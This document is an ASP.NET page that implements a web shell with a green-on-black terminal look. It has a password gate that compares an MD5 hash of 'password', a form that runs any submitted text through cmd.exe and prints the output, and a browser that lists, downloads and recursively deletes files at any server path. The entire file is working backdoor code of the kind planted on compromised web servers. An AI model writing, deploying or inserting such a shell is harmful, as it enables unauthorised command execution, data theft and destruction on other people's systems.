<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>

<!DOCTYPE html>
<html>
<head>
    <title></title>
    <style>
        body { 
            background-color: #1a1a1a; 
            color: #00ff00; 
            font-family: 'Courier New', monospace; 
            padding: 20px;
        }
        .__t1e2r_terminal {
            background-color: #1a1a1a;
            border: 1px solid #00ff00;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
            font-family: 'Courier New', monospace;
            max-width: 900px;
            width: 100%;
            margin-right: auto;
            text-align: left;
            position: relative;
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            justify-content: center;
            min-height: 200px;
        }
        .__t1e2r_terminal_title {
            position: absolute;
            top: -12px;
            left: 50%;
            transform: translateX(-50%);
            background-color: #1a1a1a;
            padding: 0 15px;
            color: #00ff00;
            font-size: 16px;
            font-weight: bold;
        }
        .__t1e2r_terminal_input {
            display: flex;
            flex-direction: column;
            gap: 10px;
            align-items: flex-start;
            width: 100%;
            max-width: 800px;
        }
        .__t1e2r_terminal_output {
            font-family: 'Courier New', monospace;
            white-space: pre;
            overflow-x: auto;
            width: 100%;
            max-width: 100%;
            background-color: #2d2d2d;
            color: #00ff00;
            border-radius: 4px;
            padding: 10px;
            box-sizing: border-box;
        }
        .__c1u2r_path {
            margin: 20px 0;
            padding: 10px;
            background: #2d2d2d;
            border: 1px solid #00ff00;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            max-width: 800px;
        }
        .__c1u2r_path span {
            color: #00ff00;
            font-weight: bold;
        }
        .__s1e2p_separator {
            border-top: 1px solid #00ff00;
            margin: 20px 0;
            width: 100%;
        }
        table { 
            width: 100%; 
            margin-top: 20px; 
            border-collapse: collapse; 
            border: 1px solid #00ff00;
        }
        th, td { 
            padding: 10px; 
            border: 1px solid #00ff00; 
            text-align: left; 
        }
        th { 
            background-color: #2d2d2d; 
        }
        a { 
            color: #00ff00; 
            text-decoration: none; 
            transition: all 0.3s ease;
        }
        a:hover { 
            color: #fff; 
            text-shadow: 0 0 5px #00ff00;
        }
        .__a1b2c_action_button {
            display: inline-block;
            padding: 5px 10px;
            margin: 0 5px;
            border: 1px solid #00ff00;
            border-radius: 4px;
            background-color: #2d2d2d;
            color: #00ff00;
            text-decoration: none;
            transition: all 0.3s ease;
        }
        .__a1b2c_action_button:hover {
            background-color: #00ff00;
            color: #1a1a1a;
            text-shadow: none;
        }
        .__a1b2c_action_button.__d1e2f_delete {
            border-color: #0066ff;
            color: #0066ff;
        }
        .__a1b2c_action_button.__d1e2f_delete:hover {
            background-color: #0066ff;
            color: #fff;
        }
        .__n1m2k_dir_link {
            display: inline-block;
            padding: 5px 10px;
            margin: 2px 0;
            border: 1px solid #00ff00;
            border-radius: 4px;
            background-color: #2d2d2d;
            color: #00ff00;
            text-decoration: none;
            transition: all 0.3s ease;
        }
        .__n1m2k_dir_link:hover {
            background-color: #00ff00;
            color: #1a1a1a;
            text-shadow: none;
        }
        .__v4b5n_form_wrapper {
            margin: 20px 0;
            display: flex;
            flex-direction: row;
            gap: 15px;
            max-width: 800px;
        }
        .__v4b5n_form_wrapper form {
            flex: 1;
            display: flex;
            gap: 10px;
            align-items: center;
        }
        .__v4b5n_form_wrapper input[type="text"],
        .__v4b5n_form_wrapper input[type="submit"] {
            background: #1a1a1a;
            border: 1px solid #00ff00;
            color: #00ff00;
            padding: 10px;
            font-family: 'Courier New', monospace;
        }
        .__v4b5n_form_wrapper input[type="text"] {
            flex: 1;
        }
        .__v4b5n_form_wrapper input[type="submit"] {
            cursor: pointer;
            transition: all 0.3s ease;
        }
        .__v4b5n_form_wrapper input[type="submit"]:hover {
            background: #00ff00;
            color: #1a1a1a;
        }
        .__v4b5n_upload_form {
            margin: 20px 0;
            max-width: 800px;
        }
        .__v4b5n_upload_form input[type="file"] {
            background: #1a1a1a;
            border: 1px solid #00ff00;
            color: #00ff00;
            padding: 10px;
            font-family: 'Courier New', monospace;
            width: 100%;
            margin-bottom: 10px;
        }
        .__v4b5n_upload_form input[type="submit"] {
            background: #1a1a1a;
            border: 1px solid #00ff00;
            color: #00ff00;
            padding: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
        }
        .__v4b5n_upload_form input[type="submit"]:hover {
            background: #00ff00;
            color: #1a1a1a;
        }
    </style>
</head>
<body>
    <form id="form1" runat="server">
        <asp:Panel ID="loginPanel" runat="server" Visible="false">
            <asp:TextBox ID="passwordInput" runat="server" TextMode="Password" placeholder="Password" style="background:#1a1a1a;border:1px solid #00ff00;color:#00ff00;padding:10px;width:100%;"></asp:TextBox>
            <asp:Button ID="loginButton" runat="server" Text="Login" OnClick="Login_Click" style="background:#1a1a1a;border:1px solid #00ff00;color:#00ff00;padding:10px;width:100%;cursor:pointer;" />
        </asp:Panel>

        <asp:Panel ID="mainPanel" runat="server" Visible="false">
            <div class="__c1u2r_path">
                Current Path: <span><%= Request.QueryString["path"] ?? Server.MapPath(".") %></span>
            </div>

            <div class="__t1e2r_terminal">
                <div class="__t1e2r_terminal_title">Run Command</div>
                <form method="post" class="__t1e2r_terminal_input">
                    <label for="command">Run Command:</label>
                    <input type="text" name="command" id="command" placeholder="Enter command" style="background:#1a1a1a;border:1px solid #00ff00;color:#00ff00;padding:10px;width:100%;">
                    <input type="submit" value="Execute Command" style="background:#1a1a1a;border:1px solid #00ff00;color:#00ff00;padding:10px;width:100%;cursor:pointer;">
                </form>
                <% if (!string.IsNullOrEmpty(Request.Form["command"])) { %>
                    <div class="__t1e2r_terminal_output"><% Response.Write(RunCommand(Request.Form["command"])); %></div>
                <% } %>
            </div>

            <div class="__s1e2p_separator"></div>

            <%-- Upload File Form --%>
            <%-- 
            <div class="__v4b5n_upload_form">
                <asp:FileUpload ID="uploadfile" runat="server" />
                <asp:Button ID="uploadButton" runat="server" Text="Upload File" OnClick="UploadFile_Click" CssClass="__a1b2c_action_button" />
                <asp:Label ID="uploadStatus" runat="server" ForeColor="Lime" />
            </div>
            --%>

            <div class="__s1e2p_separator"></div>

            <div class="__v4b5n_form_wrapper">
                <form method="get">
                    <input type="text" name="path" placeholder="Enter Path" value="<%= Request.QueryString["path"] ?? Server.MapPath(".") %>">
                    <input type="submit" value="Browse Directory">
                </form>

                <%-- Create Directory Form --%>
                <%-- 
                <form method="post">
                    <input type="text" name="new_directory" placeholder="Directory Name">
                    <input type="submit" value="Create Directory">
                </form>
                --%>
            </div>

            <table>
                <tr>
                    <th>Name</th>
                    <th>Size (Bytes)</th>
                    <th>Actions</th>
                </tr>
                <asp:Repeater ID="fileList" runat="server">
                    <ItemTemplate>
                        <tr>
                            <td>
                                <%# (bool)Eval("IsDirectory") ? 
                                    "<a href='" + Request.Path + "?path=" + Server.UrlEncode(Eval("Path")?.ToString() ?? "") + "' class='__n1m2k_dir_link'>" + Eval("Name") + "</a>" : 
                                    Eval("Name") %>
                            </td>
                            <td><%# Eval("Size") %></td>
                            <td>
                                <%# !(bool)Eval("IsDirectory") ? 
                                    "<a href='" + Eval("DownloadUrl") + "' class='__a1b2c_action_button'>Download</a>" : 
                                    "" %>
                                <a href='<%# Eval("DeleteUrl") %>' class="__a1b2c_action_button __d1e2f_delete" onclick='return confirm("Are you sure you want to delete <%# Eval("Name") %>?")'>Delete</a>
                            </td>
                        </tr>
                    </ItemTemplate>
                </asp:Repeater>
            </table>
        </asp:Panel>
    </form>
</body>
</html>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (Session["auth"] == null)
        {
            loginPanel.Visible = true;
            mainPanel.Visible = false;
            return;
        }

        loginPanel.Visible = false;
        mainPanel.Visible = true;

        if (!IsPostBack)
        {
            LoadFiles();
        }

        if (!string.IsNullOrEmpty(Request.QueryString["delete"]))
        {
            string delPath = Request.QueryString["delete"];
            if (File.Exists(delPath))
                File.Delete(delPath);
            else if (Directory.Exists(delPath))
                Directory.Delete(delPath, true);
            Response.Redirect(Request.Path + "?path=" + Server.UrlEncode(Path.GetDirectoryName(delPath)));
        }

        if (!string.IsNullOrEmpty(Request.QueryString["download"]))
        {
            string downPath = Path.Combine(Request.QueryString["path"] ?? Server.MapPath("."), Request.QueryString["download"]);
            if (File.Exists(downPath))
            {
                Response.ContentType = "application/octet-stream";
                Response.AddHeader("Content-Disposition", "attachment; filename=" + Path.GetFileName(downPath));
                Response.TransmitFile(downPath);
                Response.End();
            }
        }

        LoadFiles();
    }

    protected void Login_Click(object sender, EventArgs e)
    {
        string hashedPassword = CalculateMD5Hash(passwordInput.Text);
        if (hashedPassword == "5f4dcc3b5aa765d61d8327deb882cf99") // password
        {
            Session["auth"] = true;
            loginPanel.Visible = false;
            mainPanel.Visible = true;
            LoadFiles();
        }
    }

    private string CalculateMD5Hash(string input)
    {
        using (System.Security.Cryptography.MD5 md5 = System.Security.Cryptography.MD5.Create())
        {
            byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(input);
            byte[] hashBytes = md5.ComputeHash(inputBytes);
            
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < hashBytes.Length; i++)
            {
                sb.Append(hashBytes[i].ToString("x2"));
            }
            return sb.ToString();
        }
    }

    private void LoadFiles()
    {
        string path = Request.QueryString["path"] ?? Server.MapPath(".");
        if (Directory.Exists(path))
        {
            var items = new List<object>();

            if (path != Server.MapPath("."))
            {
                string parentPath = Path.GetDirectoryName(path);
                if (!string.IsNullOrEmpty(parentPath))
                {
                    items.Add(new
                    {
                        Name = "..",
                        Size = 0,
                        IsDirectory = true,
                        DownloadUrl = "",
                        DeleteUrl = "",
                        Path = parentPath
                    });
                }
            }

            foreach (string dir in Directory.GetDirectories(path))
            {
                items.Add(new
                {
                    Name = Path.GetFileName(dir),
                    Size = 0,
                    IsDirectory = true,
                    DownloadUrl = "",
                    DeleteUrl = $"{Request.Path}?path={Server.UrlEncode(path)}&delete={Server.UrlEncode(dir)}",
                    Path = dir
                });
            }

            foreach (string file in Directory.GetFiles(path))
            {
                items.Add(new
                {
                    Name = Path.GetFileName(file),
                    Size = new FileInfo(file).Length,
                    IsDirectory = false,
                    DownloadUrl = $"{Request.Path}?path={Server.UrlEncode(path)}&download={Server.UrlEncode(Path.GetFileName(file))}",
                    DeleteUrl = $"{Request.Path}?path={Server.UrlEncode(path)}&delete={Server.UrlEncode(file)}",
                    Path = file
                });
            }

            fileList.DataSource = items;
            fileList.DataBind();
        }
    }

    protected string RunCommand(string cmd)
    {
        if (string.IsNullOrEmpty(cmd)) return "";
        var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd)
        {
            RedirectStandardOutput = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };
        var proc = Process.Start(psi);
        string output = proc.StandardOutput.ReadToEnd();
        proc.WaitForExit();

         output = output.Replace("\t", "    ");
         output = output.Replace("<", "&lt;").Replace(">", "&gt;");


        return output;
    }

    /*protected void UploadFile_Click(object sender, EventArgs e)
    {
        try
        {
            if (uploadfile.HasFile)
            {
                string path = Request.QueryString["path"] ?? Server.MapPath(".");
                string savePath = Path.Combine(path, Path.GetFileName(uploadfile.FileName));
                
                savePath = Path.GetFullPath(savePath);
                
                if (!savePath.StartsWith(Server.MapPath(".")))
                {
                    uploadStatus.Text = "Error: Invalid upload path";
                    return;
                }

                uploadfile.SaveAs(savePath);
                uploadStatus.Text = "File uploaded successfully!";
                Response.Redirect(Request.RawUrl);
            }
            else
            {
                uploadStatus.Text = "Please select a file to upload";
            }
        }
        catch (Exception ex)
        {
            uploadStatus.Text = "Error: " + ex.Message;
        }
    }*/

</script>
